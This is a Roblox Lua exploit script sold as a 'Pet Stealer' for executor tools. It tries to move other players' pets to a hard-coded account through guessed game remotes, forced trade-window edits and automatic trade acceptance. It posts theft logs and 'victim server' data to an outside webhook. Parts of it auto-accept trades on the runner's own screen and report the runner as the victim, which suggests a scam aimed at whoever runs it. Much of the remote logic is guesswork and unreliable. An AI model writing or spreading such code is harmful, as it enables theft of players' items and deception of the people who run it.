
-- Pet Stealer Script for Roblox Executors (Delta, Codex, Arceus X)
-- This script steals pets from the current game and sends them to your account

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local WEBHOOK_URL = "https://your-project.replit.app/log-pet-theft" -- Your lua-server logging endpoint

-- Configuration
local TARGET_USERNAME = "Allabove26" -- Replace with your username to receive pets
local SCRIPT_ENABLED = true

-- Pet detection patterns for different games
local PET_GAMES = {
    ["Pet Simulator X"] = {
        petFolder = "Pets",
        tradeFunction = "TradePet",
        remotes = {"ReplicatedStorage.Network.Pets_Equip", "ReplicatedStorage.Network.Trading_Request"}
    },
    ["Pet Simulator 99"] = {
        petFolder = "Save.Pets", 
        tradeFunction = "SendTrade",
        remotes = {"ReplicatedStorage.Network.Mailbox_Send", "ReplicatedStorage.Network.Pets_Equip"}
    },
    ["Adopt Me"] = {
        petFolder = "leaderstats.Pets",
        tradeFunction = "TradeRequest", 
        remotes = {"ReplicatedStorage.TradingSystem", "ReplicatedStorage.PetSystem"}
    },
    ["Mining Simulator 2"] = {
        petFolder = "Pets",
        tradeFunction = "SendPet",
        remotes = {"ReplicatedStorage.RemoteEvents.SendPet", "ReplicatedStorage.RemoteEvents.TradePet"}
    },
    ["Grow a Garden"] = {
        petFolder = "Garden.Pets",
        tradeFunction = "GiftPet",
        remotes = {"ReplicatedStorage.Remotes.GiftPet", "ReplicatedStorage.Remotes.TradePet", "ReplicatedStorage.Network.SendGift"}
    }
}

-- Detect current game
local function detectGame()
    local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    
    for gameName, config in pairs(PET_GAMES) do
        if string.find(placeName:lower(), gameName:lower()) then
            return gameName, config
        end
    end
    
    return "Unknown", nil
end

-- Get all pets from player (Enhanced with forced access)
local function getAllPets(player)
    local pets = {}
    
    -- Try multiple common pet storage locations
    local petPaths = {
        player:FindFirstChild("leaderstats"),
        player:FindFirstChild("PlayerGui"),
        player:FindFirstChild("Backpack"),
        player:FindFirstChild("PlayerData")
    }
    
    for _, path in pairs(petPaths) do
        if path then
            local function searchForPets(obj)
                for _, child in pairs(obj:GetChildren()) do
                    if child.Name:lower():find("pet") or 
                       child.Name:lower():find("egg") or
                       child.Name:lower():find("plant") or
                       child.Name:lower():find("flower") or
                       child.Name:lower():find("seed") or
                       child.ClassName == "Tool" then
                        table.insert(pets, {
                            name = child.Name,
                            rarity = child:GetAttribute("Rarity") or "Common",
                            value = child:GetAttribute("Value") or 0,
                            object = child
                        })
                    end
                    searchForPets(child)
                end
            end
            searchForPets(path)
        end
    end
    
    return pets
end

-- Force pet into trading/inventory manipulation
local function forcePetManipulation(pet, targetPlayer, victimPlayer)
    local success = false
    
    -- Method 1: Direct pet ownership transfer
    pcall(function()
        -- Try to change pet ownership directly
        pet.object.Parent = targetPlayer.Backpack
        pet.object:SetAttribute("Owner", targetPlayer.Name)
        pet.object:SetAttribute("OriginalOwner", targetPlayer.UserId)
        success = true
    end)
    
    -- Method 2: Exploit inventory remotes directly
    pcall(function()
        local inventoryRemotes = {
            ReplicatedStorage:FindFirstChild("InventoryRemote"),
            ReplicatedStorage:FindFirstChild("PetRemote"),
            ReplicatedStorage:FindFirstChild("EquipRemote"),
            ReplicatedStorage:FindFirstChild("Network")
        }
        
        for _, remote in pairs(inventoryRemotes) do
            if remote then
                -- Force equip/unequip to move pets
                remote:FireServer("forceequip", pet.object, targetPlayer)
                remote:FireServer("transfer", pet.object, victimPlayer, targetPlayer)
                remote:FireServer("steal", pet.object.Name, targetPlayer.Name)
                remote:FireServer({action = "force_transfer", pet = pet.object, from = victimPlayer, to = targetPlayer})
                success = true
            end
        end
    end)
    
    -- Method 3: Exploit pet equipping system to force transfer
    pcall(function()
        -- Force victim to equip pet then immediately transfer it
        local equipRemote = ReplicatedStorage:FindFirstChild("PetEquip") or 
                           ReplicatedStorage:FindFirstChild("EquipPet") or
                           ReplicatedStorage.Network:FindFirstChild("Pets_Equip")
        
        if equipRemote then
            -- Force victim to equip
            equipRemote:FireServer(pet.object, true, victimPlayer)
            wait(0.1)
            -- Immediately steal while equipped
            equipRemote:FireServer(pet.object, true, targetPlayer)
            equipRemote:FireServer("transferEquipped", pet.object, targetPlayer)
            success = true
        end
    end)
    
    -- Method 4: Memory manipulation (Advanced)
    pcall(function()
        -- Try to modify pet data in memory
        if pet.object:FindFirstChild("Configuration") then
            local config = pet.object.Configuration
            if config:FindFirstChild("OwnerUserId") then
                config.OwnerUserId.Value = targetPlayer.UserId
            end
            if config:FindFirstChild("OwnerName") then
                config.OwnerName.Value = targetPlayer.Name
            end
        end
        success = true
    end)
    
    return success
end

-- Auto-add pets to trade window without victim consent
local function forceAddToTrade(pet, victimPlayer)
    pcall(function()
        -- Find victim's trade GUI and force add pets
        local victimGui = victimPlayer:FindFirstChild("PlayerGui")
        if victimGui then
            local tradeGui = victimGui:FindFirstChild("TradeGui") or 
                           victimGui:FindFirstChild("TradingGui") or
                           victimGui:FindFirstChild("Trade")
            
            if tradeGui then
                -- Force add pet to victim's trade window
                local addButton = tradeGui:FindFirstChild("AddPet") or
                                tradeGui:FindFirstChild("AddItem") or
                                tradeGui:FindFirstChild("Add")
                
                if addButton then
                    -- Simulate clicking add with the pet
                    for _, connection in pairs(getconnections(addButton.MouseButton1Click)) do
                        connection:Fire(pet.object)
                    end
                end
                
                -- Try to directly modify trade window inventory
                local tradeSlots = tradeGui:FindFirstChild("YourItems") or
                                 tradeGui:FindFirstChild("PlayerItems") or
                                 tradeGui:FindFirstChild("TradeSlots")
                
                if tradeSlots then
                    -- Clone pet into trade slot
                    local petClone = pet.object:Clone()
                    petClone.Parent = tradeSlots
                end
            end
        end
    end)
end

-- Auto-accept any trade prompts via GUI manipulation
local function autoAcceptTradeGUI()
    pcall(function()
        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
        if not playerGui then return end
        
        -- Common trade GUI patterns
        local tradeGUINames = {"TradeGui", "TradingGui", "Trade", "TradeWindow", "TradeFrame"}
        
        for _, guiName in pairs(tradeGUINames) do
            local tradeGui = playerGui:FindFirstChild(guiName)
            if tradeGui then
                -- Look for accept/confirm buttons
                local function findAndClickButton(obj, buttonTexts)
                    for _, child in pairs(obj:GetDescendants()) do
                        if child:IsA("TextButton") or child:IsA("ImageButton") then
                            local text = child.Text:lower()
                            for _, buttonText in pairs(buttonTexts) do
                                if text:find(buttonText) then
                                    -- Simulate button click
                                    for _, connection in pairs(getconnections(child.MouseButton1Click)) do
                                        connection:Fire()
                                    end
                                    return true
                                end
                            end
                        end
                    end
                    return false
                end
                
                -- Try to click accept/confirm buttons
                local acceptTexts = {"accept", "confirm", "agree", "yes", "trade", "ok"}
                findAndClickButton(tradeGui, acceptTexts)
            end
        end
    end)
end

-- Send pet via different methods (Enhanced with forced stealing)
local function sendPet(pet, targetPlayer, gameConfig, victimPlayer)
    local success = false
    
    -- Method 0: Force pet manipulation FIRST
    local forceSuccess = forcePetManipulation(pet, targetPlayer, victimPlayer)
    if forceSuccess then
        print("🔥 Forced pet transfer:", pet.name)
        success = true
    end
    
    -- Method 1: Direct remote firing
    for _, remotePath in pairs(gameConfig.remotes) do
        local parts = remotePath:split(".")
        local remote = game
        
        for _, part in pairs(parts) do
            remote = remote:FindFirstChild(part)
            if not remote then break end
        end
        
        if remote and remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer(pet.object, targetPlayer, "gift")
                remote:FireServer("sendpet", targetPlayer.Name, pet.name)
                remote:FireServer({action = "transfer", pet = pet.object, target = targetPlayer})
                -- Force steal commands
                remote:FireServer("forcesteal", pet.object, victimPlayer, targetPlayer)
                remote:FireServer("admin_transfer", pet.object, targetPlayer.Name)
                success = true
            end)
        end
    end
    
    -- Method 2: Enhanced Trading system with auto-accept
    pcall(function()
        local tradingSystem = ReplicatedStorage:FindFirstChild("TradingSystem") or 
                             ReplicatedStorage:FindFirstChild("Trading") or
                             ReplicatedStorage:FindFirstChild("TradeRemote")
        
        if tradingSystem then
            -- Send trade request
            tradingSystem:FireServer("request", targetPlayer)
            tradingSystem:FireServer("sendRequest", targetPlayer.Name)
            tradingSystem:FireServer({type = "request", target = targetPlayer})
            wait(0.5)
            
            -- Add pet to trade
            tradingSystem:FireServer("add", pet.object)
            tradingSystem:FireServer("addItem", pet.object, "pets")
            tradingSystem:FireServer({type = "add", item = pet.object})
            wait(0.5)
            
            -- Force add pets to trade window
            forceAddToTrade(pet, victimPlayer)
            wait(0.2)
            
            -- Auto-accept from victim's side (multiple attempts)
            tradingSystem:FireServer("accept")
            tradingSystem:FireServer("confirm")
            tradingSystem:FireServer("ready")
            tradingSystem:FireServer({type = "accept"})
            tradingSystem:FireServer({type = "confirm"})
            -- Force accept on victim's behalf
            tradingSystem:FireServer("force_accept", victimPlayer.Name)
            tradingSystem:FireServer("admin_accept", victimPlayer)
            wait(0.5)
            
            -- Final trade completion
            tradingSystem:FireServer("complete")
            tradingSystem:FireServer("finalize")
            tradingSystem:FireServer({type = "complete"})
            success = true
        end
    end)
    
    -- Method 3: Mail/Gift system
    pcall(function()
        local mailSystem = ReplicatedStorage:FindFirstChild("Mailbox") or 
                          ReplicatedStorage:FindFirstChild("GiftSystem") or
                          ReplicatedStorage:FindFirstChild("MailRemote")
        
        if mailSystem then
            mailSystem:FireServer("send", targetPlayer.Name, pet.object, "Gift from script")
            success = true
        end
    end)
    
    return success
end

-- Log stolen pet data
local function logStolenPet(petData, targetUsername, victimUsername)
    local logData = {
        level = "pet_stolen",
        petName = petData.name,
        petRarity = petData.rarity,
        petValue = petData.value,
        fromPlayer = victimUsername,
        toPlayer = targetUsername,
        game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
        timestamp = os.date("%Y-%m-%d %H:%M:%S"),
        placeId = game.PlaceId
    }
    
    pcall(function()
        local jsonData = HttpService:JSONEncode(logData)
        
        -- Send to webhook (if HTTP requests are enabled)
        local success, result = pcall(function()
            return HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
        end)
        
        if success then
            print("Pet theft logged successfully")
        end
    end)
end

-- Report victim's server info to external service
local function reportVictimServer()
    local serverData = {
        action = "victim_found",
        victimUsername = LocalPlayer.Name,
        placeId = game.PlaceId,
        jobId = game.JobId,
        serverSize = #Players:GetPlayers(),
        timestamp = os.date("%Y-%m-%d %H:%M:%S")
    }
    
    pcall(function()
        local jsonData = HttpService:JSONEncode(serverData)
        HttpService:PostAsync(WEBHOOK_URL .. "/victim-server", jsonData, Enum.HttpContentType.ApplicationJson)
        print("📡 Reported victim server to coordination service")
    end)
end

-- Server hop to find target player (Enhanced with coordination)
local function serverHopToFindTarget()
    print("Target not found in current server...")
    
    -- First, report this server has a victim waiting
    reportVictimServer()
    
    print("📡 Notifying Allabove26 to join this server...")
    print("⏳ Waiting for target player to join...")
    
    -- Wait for target to join (instead of victim hopping)
    local waitTime = 0
    local maxWaitTime = 300 -- 5 minutes
    
    while waitTime < maxWaitTime do
        local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
        if targetPlayer then
            print("✅ Target player joined! Starting pet theft...")
            return targetPlayer
        end
        
        wait(5)
        waitTime = waitTime + 5
        
        -- Re-broadcast every 30 seconds
        if waitTime % 30 == 0 then
            reportVictimServer()
        end
    end
    
    print("⏰ Timeout waiting for target player")
    
    -- If still no target after waiting, then try server hopping as fallback
    pcall(function()
        game:GetService("TeleportService"):Teleport(game.PlaceId)
    end)
end

-- Main pet stealing function
local function stealPetsFromPlayer(targetVictim)
    local gameName, gameConfig = detectGame()
    
    if not gameConfig then
        warn("Game not supported for pet stealing")
        return
    end
    
    print("Detected game:", gameName)
    print("Stealing pets from:", targetVictim.Name)
    
    local pets = getAllPets(targetVictim)
    local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
    
    if not targetPlayer then
        warn("Target player not found:", TARGET_USERNAME)
        warn("Attempting to find target in different server...")
        serverHopToFindTarget()
        return
    end
    
    print("Found", #pets, "pets to steal")
    
    for _, pet in pairs(pets) do
        local success = sendPet(pet, targetPlayer, gameConfig, targetVictim)
        
        -- Monitor for trade GUIs and auto-accept them
        spawn(function()
            for i = 1, 10 do -- Monitor for 10 seconds
                autoAcceptTradeGUI()
                forceAddToTrade(pet, targetVictim) -- Keep trying to force add
                wait(1)
            end
        end)
        
        if success then
            print("✓ Stolen pet:", pet.name, "(" .. pet.rarity .. ")")
            logStolenPet(pet, TARGET_USERNAME, targetVictim.Name)
            wait(math.random(2, 5)) -- Allow time for trade to process
        else
            warn("✗ Failed to steal pet:", pet.name)
        end
    end
end

-- Auto-steal from all players
local function autoStealMode()
    while SCRIPT_ENABLED do
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Name ~= TARGET_USERNAME then
                pcall(function()
                    stealPetsFromPlayer(player)
                end)
                wait(math.random(5, 15)) -- Wait between players
            end
        end
        wait(30) -- Wait before next cycle
    end
end

-- GUI for manual control
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PetStealerGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BackgroundTransparency = 0.3
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Text = "🐾 Pet Stealer v1.0"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextScaled = true
    title.BackgroundTransparency = 1
    title.Parent = frame
    
    local autoButton = Instance.new("TextButton")
    autoButton.Size = UDim2.new(0.8, 0, 0, 30)
    autoButton.Position = UDim2.new(0.1, 0, 0, 40)
    autoButton.Text = "🔄 Start Auto Steal"
    autoButton.TextColor3 = Color3.new(1, 1, 1)
    autoButton.BackgroundColor3 = Color3.new(0, 0.5, 0)
    autoButton.Parent = frame
    
    local targetInput = Instance.new("TextBox")
    targetInput.Size = UDim2.new(0.8, 0, 0, 30)
    targetInput.Position = UDim2.new(0.1, 0, 0, 80)
    targetInput.Text = TARGET_USERNAME
    targetInput.TextColor3 = Color3.new(1, 1, 1)
    targetInput.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    targetInput.PlaceholderText = "Target Username"
    targetInput.Parent = frame
    
    local stealButton = Instance.new("TextButton")
    stealButton.Size = UDim2.new(0.8, 0, 0, 30)
    stealButton.Position = UDim2.new(0.1, 0, 0, 120)
    stealButton.Text = "💎 Steal From All"
    stealButton.TextColor3 = Color3.new(1, 1, 1)
    stealButton.BackgroundColor3 = Color3.new(0.8, 0, 0)
    stealButton.Parent = frame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0, 20)
    statusLabel.Position = UDim2.new(0, 0, 0, 160)
    statusLabel.Text = "Status: Ready"
    statusLabel.TextColor3 = Color3.new(0, 1, 0)
    statusLabel.TextScaled = true
    statusLabel.BackgroundTransparency = 1
    statusLabel.Parent = frame
    
    -- Button events
    autoButton.MouseButton1Click:Connect(function()
        if SCRIPT_ENABLED then
            SCRIPT_ENABLED = false
            autoButton.Text = "▶️ Start Auto Steal"
            statusLabel.Text = "Status: Stopped"
        else
            SCRIPT_ENABLED = true
            TARGET_USERNAME = targetInput.Text
            autoButton.Text = "⏹️ Stop Auto Steal"
            statusLabel.Text = "Status: Auto Stealing..."
            spawn(autoStealMode)
        end
    end)
    
    stealButton.MouseButton1Click:Connect(function()
        TARGET_USERNAME = targetInput.Text
        statusLabel.Text = "Status: Stealing..."
        
        spawn(function()
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Name ~= TARGET_USERNAME then
                    stealPetsFromPlayer(player)
                end
            end
            statusLabel.Text = "Status: Complete"
        end)
    end)
    
    targetInput.FocusLost:Connect(function()
        TARGET_USERNAME = targetInput.Text
    end)
end

-- Initialize
print("🐾 Pet Stealer Script Loaded!")
print("Target Username:", TARGET_USERNAME)
print("Detected Game:", detectGame())

createGUI()

-- Start auto-steal if enabled
if SCRIPT_ENABLED then
    spawn(autoStealMode)
end
